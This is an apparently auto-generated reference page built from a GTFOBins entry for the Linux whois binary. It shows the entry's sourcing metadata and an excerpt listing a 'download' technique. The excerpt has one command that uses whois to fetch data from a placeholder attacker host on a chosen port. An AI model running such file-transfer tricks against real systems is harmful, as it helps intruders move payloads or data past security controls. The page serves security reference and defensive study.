---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# whois

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `whois` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/whois` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for whois covering download, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/whois.md)
- Source verification: [source record](../../sources/gtfobins/whois.md)

## Aliases

- `whois`

## Source Verification

[source record](../../sources/gtfobins/whois.md)

## Evidence Excerpt

```text
_body: ''
_name: whois
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/whois
functions:
download:
- code: whois -h attacker.com -p 12345 x
comment: Received data has instances of the `\r` byte stripped.
contexts:
```
